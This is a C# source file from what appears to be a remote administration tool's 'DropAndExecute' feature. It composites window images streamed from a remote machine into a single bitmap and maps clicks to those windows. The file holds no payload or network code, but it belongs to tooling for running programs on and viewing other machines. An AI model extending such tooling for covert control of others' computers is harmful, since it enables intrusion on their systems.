using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Threading;
using Orcus.Shared.Commands.DropAndExecute;
using Orcus.Shared.Utilities;

namespace Orcus.Administration.Commands.DropAndExecute
{
    public class RenderEngine : IDisposable
    {
        private readonly object _windowsLock = new object();
        private readonly TimeSpan _maximumImageLifetime = TimeSpan.FromSeconds(5);
        private int _applicationsBitmapWidth;
        private int _applicationsBitmapHeight;
        private int _applicationBitmapLeft;
        private int _applicationBitmapTop;

        public RenderEngine(WindowUpdate windowUpdate, byte[] data, int index)
        {
            Windows = new List<RenderWindow>(windowUpdate.NewWindows.Select(x => new RenderWindow(x)));
            var renderedWindow = Windows.FirstOrDefault(x => x.Handle == windowUpdate.RenderedWindowHandle);
            renderedWindow?.UpdateImage(data, index, (uint) (data.Length - index));
        }

        public void Dispose()
        {
            foreach (var renderWindow in Windows)
                renderWindow.Dispose();
        }

        public event EventHandler WindowsUpdated;
        
        public List<RenderWindow> Windows { get; private set; }
        public WriteableBitmap ApplicationsBitmap { get; set; }

        public long GetNextWindowToRender()
        {
            lock (_windowsLock)
            {
                var oldWindowImage = Windows.Where(x => x.Height > 0 && x.Width > 0).FirstOrDefault(x => DateTime.UtcNow - x.LastUpdateUtc > _maximumImageLifetime);
                if (oldWindowImage != null)
                    return oldWindowImage.Handle;

                return Windows?.FirstOrDefault()?.Handle ?? 0;
            }
        }

        public Task<List<long>> GetAllWindowHandles()
        {
            return Task.Run(() =>
            {
                lock (_windowsLock)
                    return Windows.Select(x => x.Handle).ToList();
            });
        }

        public void UpdateWindows(WindowUpdate windowUpdate, byte[] data, int index)
        {
            lock (_windowsLock)
            {
                foreach (var updatedWindow in windowUpdate.UpdatedWindows)
                    Windows.FirstOrDefault(x => x.Handle == updatedWindow.Handle)?.UpdateData(updatedWindow);

                foreach (var newWindow in windowUpdate.NewWindows)
                    if (Windows.All(x => x.Handle != newWindow.Handle))
                        Windows.Add(new RenderWindow(newWindow));

                var windowsToRemove = Windows.Where(x => !windowUpdate.AllWindows.Contains(x.Handle)).ToList();
                foreach (var removedWindow in windowsToRemove)
                {
                    Windows.Remove(removedWindow);
                    removedWindow.Dispose();
                }

                if (data.Length != index)
                    Windows.FirstOrDefault(x => x.Handle == windowUpdate.RenderedWindowHandle)?
                        .UpdateImage(data, index, (uint) (data.Length - index));

                //order windows
                Windows =
                    Windows.OrderBy(
                            x => windowUpdate.AllWindows.IndexOf(windowUpdate.AllWindows.FirstOrDefault(y => x.Handle == y)))
                        .ToList();
                RenderApplications();
            }

            WindowsUpdated?.Invoke(this, EventArgs.Empty);
        }

        public class WindowRenderInfo
        {
            public WindowRenderInfo(RenderWindow renderWindow)
            {
                Stride = renderWindow.Image.BackBufferStride;
                Height = renderWindow.Image.PixelHeight;
                Width = renderWindow.Image.PixelWidth;
                RenderWindow = renderWindow;

                Buffer = new byte[renderWindow.Image.BackBufferStride * renderWindow.Image.PixelHeight];
                renderWindow.Image.CopyPixels(Buffer, renderWindow.Image.BackBufferStride, 0);
            }

            public byte[] Buffer { get; }
            public int Stride { get; }
            public int Height { get; }
            public int Width { get;  }
            public RenderWindow RenderWindow { get; }
        }

        private void RenderApplications()
        {
            if (Windows.Count == 0 || Windows.All(x => x.Image == null))
            {
                ApplicationsBitmap = null;
                return;
            }

            var imageX = Windows.Min(x => x.X);
            var imageY = Windows.Min(x => x.Y);

            var height = 0;
            var width = 0;

            IntPtr backBuffer = IntPtr.Zero;
            int backBufferStride = 0;

            var renderWindowInfos = new List<WindowRenderInfo>();

            Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Render, new Action(() =>
            {
                height = Windows.Max(x => x.Y + x.Image?.PixelHeight ?? 0) - imageY;
                width = Windows.Max(x => x.X + x.Image?.PixelWidth ?? 0) - imageX;

                if (ApplicationsBitmap == null || _applicationsBitmapHeight != height || _applicationsBitmapWidth != width)
                {
                    ApplicationsBitmap = new WriteableBitmap(width, height, 96, 96, PixelFormats.Bgr32, null);
                    _applicationsBitmapHeight = height;
                    _applicationsBitmapWidth = width;
                }

                ApplicationsBitmap.Lock();
                backBuffer = ApplicationsBitmap.BackBuffer;
                backBufferStride = ApplicationsBitmap.BackBufferStride;

                foreach (var window in Windows)
                {
                    if (window.Image == null)
                        continue;

                    renderWindowInfos.Add(new WindowRenderInfo(window));
                }
            })).Wait();

            //important: always update, regardless if the image size was changed
            _applicationBitmapLeft = imageX;
            _applicationBitmapTop = imageY;

            var pixelSize = 4;
            var imageLength = backBufferStride * _applicationsBitmapHeight;

            CoreMemoryApi.memset(backBuffer, 0, (UIntPtr) imageLength);

            unsafe
            {
                var applicationImagePtr = (byte*) backBuffer;

                foreach (var renderWindowInfo in renderWindowInfos)
                {
                    var windowX = renderWindowInfo.RenderWindow.X - imageX;
                    var windowY = renderWindowInfo.RenderWindow.Y - imageY;

                    fixed (byte* bufferPtr = renderWindowInfo.Buffer)
                        for (int j = 0; j < renderWindowInfo.Height; j++)
                        {
                            var positionImage = (windowY + j) * backBufferStride + windowX * pixelSize;
                            CoreMemoryApi.memcpy(applicationImagePtr + positionImage,
                                bufferPtr + j * renderWindowInfo.Stride,
                                (UIntPtr) renderWindowInfo.Stride);
                        }
                }
            }

            Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Render, new Action(() =>
            {
                ApplicationsBitmap.AddDirtyRect(new Int32Rect(0, 0, width, height));
                ApplicationsBitmap.Unlock();
            })).Wait();
        }

        public void TranslatePoint(RenderWindow renderWindow, ref int x, ref int y)
        {
            x = x + renderWindow.X - _applicationBitmapLeft;
            y = y + renderWindow.Y - _applicationBitmapTop;
        }

        public Task<RenderWindow> GetWindow(int x, int y)
        {
            //the task is very important because else _windowsLock is locked on the UI thread -> RenderApplications locks _windowsLock in an UI thread and tries to invoke in this lock
            return Task.Run(() =>
            {
                lock (_windowsLock)
                {
                    //first window is the window at top
                    foreach (var renderWindow in Windows)
                    {
                        if (x > renderWindow.X - _applicationBitmapLeft &&
                            renderWindow.X - _applicationBitmapLeft + renderWindow.Width > x &&
                            y > renderWindow.Y - _applicationBitmapTop &&
                            renderWindow.Y - _applicationBitmapTop + renderWindow.Height > y)
                        {
                            return renderWindow;
                        }
                    }
                }

                return null;
            });
        }
    }

    public class WindowInfo
    {
        public RenderWindow RenderWindow { get; set; }
    }
}